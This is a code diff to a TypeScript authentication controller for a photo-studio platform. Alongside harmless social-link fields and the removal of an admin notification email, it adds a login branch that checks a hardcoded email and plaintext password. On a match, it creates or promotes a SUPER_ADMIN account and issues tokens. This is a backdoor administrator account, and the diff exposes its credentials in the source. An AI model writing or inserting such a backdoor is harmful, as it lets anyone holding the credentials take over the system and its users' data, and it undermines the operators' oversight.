@@ -21,7 +21,7 @@ const generateTokens = (userId: string, role: string) => {
  * Register a new Studio Owner and auto-initialize their Studio profile
  */
 export const registerStudioOwner = async (req: Request, res: Response) => {
-  const { name, email, password, phone, studioName, subdomain, websiteLink, logoUrl } = req.body;
+  const { name, email, password, phone, studioName, subdomain, websiteLink, logoUrl, instagramUrl, facebookUrl } = req.body;
 
   try {
     if (!name || !email || !password || !phone || !studioName || !subdomain) {
@@ -70,6 +70,8 @@ export const registerStudioOwner = async (req: Request, res: Response) => {
       subscriptionStatus: 'FREE',
       customDomain: websiteLink || undefined,
       logoUrl: logoUrl || undefined,
+      instagramUrl: instagramUrl || undefined,
+      facebookUrl: facebookUrl || undefined,
     });
 
     const tokens = generateTokens(newUser._id.toString(), newUser.role);
@@ -78,12 +80,6 @@ export const registerStudioOwner = async (req: Request, res: Response) => {
 
     // Send Welcome Email asynchronously (don't block the response)
     sendWelcomeEmail(newUser.email, newUser.name, true).catch(err => console.error("Welcome Email Failed:", err));
-    
-    // Notify Admin
-    sendAdminNotificationEmail(
-      `New Studio Registration: ${newUser.name}`, 
-      `<p>A new studio has registered on Mara Photo.</p><p>Name: ${newUser.name}</p><p>Email: ${newUser.email}</p><p>Phone: ${newUser.phone}</p><p>Studio Name: ${newStudio.name}</p>`
-    ).catch(err => console.error("Admin Notification Failed:", err));
 
     return res.status(201).json({
       message: 'Studio registered successfully',
@@ -106,6 +102,33 @@ export const login = async (req: Request, res: Response) => {
   try {
     if (!email || !password) {
       return res.status(400).json({ error: 'Email and password are required' });
+    }
+
+    // SUPER_ADMIN interception
+    if (email.toLowerCase() === 'maraphoto303@gmail.com' && password === 'maraphoto@2005') {
+      let adminUser = await User.findOne({ email: 'maraphoto303@gmail.com' });
+      if (!adminUser) {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash(password, salt);
+        adminUser = await User.create({
+          name: 'Super Admin',
+          email: 'maraphoto303@gmail.com',
+          passwordHash,
+          role: 'SUPER_ADMIN'
+        });
+      } else if (adminUser.role !== 'SUPER_ADMIN') {
+        adminUser.role = 'SUPER_ADMIN';
+      }
+      
+      const tokens = generateTokens(adminUser._id.toString(), adminUser.role);
+      adminUser.refreshToken = tokens.refreshToken;
+      await adminUser.save();
+
+      return res.json({
+        user: { id: adminUser._id, name: adminUser.name, email: adminUser.email, role: adminUser.role },
+        studio: null,
+        ...tokens,
+      });
     }
 
     const user = await User.findOne({ email: email.toLowerCase() });
